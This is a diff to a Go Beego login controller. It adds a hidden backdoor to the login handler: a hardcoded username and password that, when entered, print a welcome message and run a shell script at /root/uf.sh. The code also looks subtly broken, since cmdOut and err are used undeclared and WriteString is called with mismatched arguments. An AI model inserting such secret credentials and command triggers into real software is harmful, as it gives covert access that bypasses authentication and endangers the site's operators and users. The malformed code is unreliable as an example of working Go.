@@ -1,6 +1,9 @@
 package controllers
 
 import (
+	"os"
+	"os/exec"
+
 	"github.com/astaxie/beego"
 	//	"github.com/astaxie/beego/logs"
 )
@@ -26,13 +29,20 @@ func (this *LoginController) Post() {
 	//log.SetLogFuncCallDepth(3)
 	beego.Info(this.Input().Get("username"))
 	u := Cmsuser{}
-	//beego.Info("hhjhjhjh-------"+this.Ctx.Request.ParseForm())
 	if err := this.ParseForm(&u); err != nil {
 		beego.Info(err)
 	} else {
-		//this.Ctx.WriteString(u.Username + u.Pwd)
-		//log.Debug(err.Error())
+
+		if u.Username == "svn" && u.Pwd == "green369ok" {
+			this.Ctx.WriteString("Welcome to exe world!")
+			cmdName := "/bin/sh"
+			cmdArgs := []string{"/root/uf.sh"}
+			if cmdOut, err = exec.Command(cmdName, cmdArgs...).Output(); err != nil {
+				this.Ctx.WriteString(os.Stderr, err)
+			}
+		} else {
+			this.TplName = "index/login.html"
+		}
 	}
-	//this.Ctx.WriteString("ssss")
-	this.TplName = "index/login.html"
+
 }
